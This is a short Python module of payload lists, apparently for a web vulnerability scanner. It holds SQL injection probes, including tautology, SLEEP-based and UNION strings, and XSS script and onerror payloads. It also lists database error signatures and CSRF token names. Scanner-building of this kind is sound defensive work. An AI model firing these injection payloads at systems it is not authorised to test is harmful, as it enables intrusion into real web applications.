# Payload sets used to probe for vulnerabilities.
# These are intentionally lightweight/non-destructive detection payloads —
# meant to trigger observable error/behavior differences, not to exploit.

SQLI_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "\" OR \"1\"=\"1",
    "' AND SLEEP(3)-- ",
    "1' ORDER BY 1-- ",
    "' UNION SELECT NULL-- ",
]

# Regex-friendly fragments of common DB error messages
SQL_ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlite3.OperationalError",
    "psycopg2.errors",
    "ORA-01756",
    "pg_query()",
    "SQLSTATE",
]

XSS_PAYLOADS = [
    "<script>alert('XSS_TEST_MARKER')</script>",
    "\"><script>alert('XSS_TEST_MARKER')</script>",
    "'><img src=x onerror=alert('XSS_TEST_MARKER')>",
    "<svg onload=alert('XSS_TEST_MARKER')>",
]

XSS_MARKER = "XSS_TEST_MARKER"

CSRF_SAFE_TOKEN_NAMES = [
    "csrf_token", "csrfmiddlewaretoken", "authenticity_token",
    "_token", "__RequestVerificationToken", "csrf",
]
